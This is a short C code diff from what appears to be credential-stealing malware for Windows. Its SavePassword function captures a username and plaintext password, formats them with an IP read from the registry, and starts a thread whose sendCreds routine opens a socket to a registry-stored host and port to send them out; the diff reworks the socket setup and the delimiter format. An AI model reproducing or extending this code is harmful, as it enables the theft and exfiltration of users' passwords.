@@ -2,6 +2,10 @@
 
 void sendCreds(char* creds)
 {
+	WSADATA wsa;
+	SOCKET s;
+	struct sockaddr_in server;
+
 	char* ip = getIPReg(L"ipa");
 	DWORD port = getPtReg();
 	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { return 1; } 
@@ -30,14 +34,10 @@ error:
 
 int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 {
-	WSADATA wsa;
-	SOCKET s;
-	struct sockaddr_in server;
-
 	char* creds = (char*)malloc(150);
 
 	char* eip = getIPReg(L"eip");
-	sprintf(creds, "%ws:%ws;end;%s;", username->Buffer, password->Buffer, eip);
+	sprintf(creds, "%ws\x11%ws\x12%s", username->Buffer, password->Buffer, eip);
 	free(eip);
 
 	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&sendCreds, creds, 0, NULL);
